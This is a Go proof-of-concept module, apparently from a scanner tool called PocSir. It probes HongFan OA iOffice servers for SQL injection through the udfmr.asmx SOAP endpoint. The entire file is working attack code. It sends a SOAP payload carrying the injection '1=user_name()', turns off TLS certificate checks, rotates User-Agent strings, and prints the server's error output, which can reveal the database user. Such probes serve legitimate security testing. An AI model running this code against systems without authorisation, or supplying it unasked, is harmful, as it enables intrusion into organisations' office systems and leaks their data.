package poc

import (
	"PocSir/common"
	"bytes"
	"crypto/tls"
	"io"
	"net/http"
	"strings"
	"time"
)

func HongFan_Ioffice_Sql(target string) {
	pocUrl := target + "/iOffice/prg/set/wss/udfmr.asmx"
	headers := map[string]string{
		"User-Agent":   getRandUa(),
		"Content-Type": "text/xml; charset=utf-8",
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}
	payload := []byte(`<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
            <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
            <condition>1=user_name()</condition>
            </GetEmpSearch>
        </soap:Body>
    </soap:Envelope>`)
	request, err := http.NewRequest("POST", pocUrl, bytes.NewBuffer(payload))
	if err != nil {
		common.ErrMsg.Printf("[-]Error creating request: %v\n", err)
		return
	}
	for key, value := range headers {
		request.Header.Set(key, value)
	}

	resp, err := client.Do(request)
	if err != nil {
		common.ErrMsg.Printf("[-]%s is timeout\n", target)
		return
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == http.StatusInternalServerError && strings.Contains(string(data), "服务器无法处理请求") {
		common.Right.Printf("[+]%s 存在红帆OA Ioffice Udfmr.asmx SQL注入漏洞\n", target)
		common.TextPut.Printf(string(data) + "\n")
	} else {
		common.ErrMsg.Printf("[-]%s 不存在红帆OA Ioffice Udfmr.asmx SQL注入漏洞\n", target)
	}
}
